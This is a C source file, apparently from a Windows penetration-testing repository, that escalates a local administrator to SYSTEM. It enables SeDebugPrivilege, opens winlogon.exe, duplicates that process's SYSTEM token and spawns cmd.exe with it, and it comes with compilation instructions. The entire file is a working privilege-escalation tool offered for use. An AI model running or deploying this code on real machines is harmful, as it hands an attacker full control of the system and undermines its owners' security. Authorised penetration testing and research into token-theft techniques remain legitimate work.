// C program that launches a CMD as Local System using the privilege 'SeDebugPrivilege'.
// Must be run with local admin rights.
// https://github.com/JFR-C/Windows-Penetration-Testing
// Compilation: cl RunAsLocalSystem.c /link advapi32.lib

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL EnablePrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        //printf("[-] LookupPrivilegeValue failed.\n");
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        //printf("[-] AdjustTokenPrivileges failed.\n");
        return FALSE;
    }
    return TRUE;
}

DWORD GetWinlogonPID() {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot;
    DWORD pid = 0;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        //printf("[-] Failed to create snapshot.\n");
        return 0;
    }
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, "winlogon.exe") == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

int main() {

//printf(" ----- RunAs Local System -----\n");
// Step 1 - Enable 'SeDebugPrivilege'

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        //printf("[-] OpenProcessToken failed.\n");
        return 1;
    }
    if (!EnablePrivilege(hToken, SE_DEBUG_NAME)) {
        //printf("[-] Failed to enable SeDebugPrivilege.\n");
        CloseHandle(hToken);
        return 1;
    }
    CloseHandle(hToken);
    printf("[+] SeDebugPrivilege enabled.\n");


// Step 2 - Find the PID of the SYSTEM-level process 'winlogon.exe'

    DWORD pid = GetWinlogonPID();
    if (!pid) {
        //printf("[-] winlogon.exe not found.\n");
        return 1;
    }

// Step 3 - Open the SYSTEM-level process 'winlogon.exe' with PROCESS_QUERY_INFORMATION & PROCESS_DUP_HANDLE rights

    HANDLE hSystemProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hSystemProc) {
        //printf("[-] Failed to open SYSTEM process.\n");
        return 1;
    }

    HANDLE hSystemToken;
    if (!OpenProcessToken(hSystemProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hSystemToken)) {
        //printf("[-] Failed to open process token.\n");
        CloseHandle(hSystemProc);
        return 1;
    }

// Step 4 - Extract and duplicate the access token from that process.

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        //printf("[-] Failed to duplicate token.\n");
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProc);
        return 1;
    }

    STARTUPINFO si = { sizeof(STARTUPINFO) };
	  PROCESS_INFORMATION pi;


// Step 5 - Use it to spawn a new process 'cmd.exe' as SYSTEM.

    if (!CreateProcessWithTokenW(hDupToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        //printf("[-] Failed to create SYSTEM process.\n");
        CloseHandle(hDupToken);
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProc);
        return 1;
    }

    printf("[+] SYSTEM cmd.exe launched!\n");
    CloseHandle(hDupToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProc);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
